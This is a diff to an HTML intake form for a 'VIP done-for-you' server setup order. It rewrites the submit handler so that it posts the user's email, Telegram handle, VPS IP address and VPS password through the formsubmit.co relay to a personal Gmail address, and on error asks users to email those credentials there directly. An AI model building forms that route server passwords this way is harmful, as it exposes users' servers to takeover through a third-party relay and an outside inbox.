@@ -213,14 +213,43 @@
 </div>
 
 <script>
-  function handleSubmit() {
+  async function handleSubmit() {
     const btn = document.getElementById('submitBtn');
     btn.disabled = true;
-    btn.innerText = 'Submitting...';
-    setTimeout(() => {
-      document.getElementById('dfyForm').style.display = 'none';
-      document.getElementById('confirmationMsg').style.display = 'block';
-    }, 800);
+    btn.innerText = 'Transmitting Configuration...';
+
+    const payload = {
+      _subject: `[VIP DFY Order] New Setup Intake: ${document.getElementById('contactEmail').value}`,
+      contactEmail: document.getElementById('contactEmail').value,
+      telegramHandle: document.getElementById('telegramHandle').value,
+      vpsProvider: document.getElementById('vpsProvider').value,
+      vpsIp: document.getElementById('vpsIp').value,
+      vpsPass: document.getElementById('vpsPass').value,
+      customNotes: document.getElementById('customNotes').value,
+      timestamp: new Date().toISOString()
+    };
+
+    try {
+      const res = await fetch('https://formsubmit.co/ajax/b0ynghe0lx@gmail.com', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      if (res.ok) {
+        document.getElementById('dfyForm').style.display = 'none';
+        document.getElementById('confirmationMsg').style.display = 'block';
+      } else {
+        throw new Error('Server returned status ' + res.status);
+      }
+    } catch (err) {
+      btn.disabled = false;
+      btn.innerText = '🚀 Retry Configuration Submission';
+      alert('Transmission error: ' + err.message + '\nPlease check internet connection or send credentials securely to b0ynghe0lx@gmail.com');
+    }
   }
 </script>
 
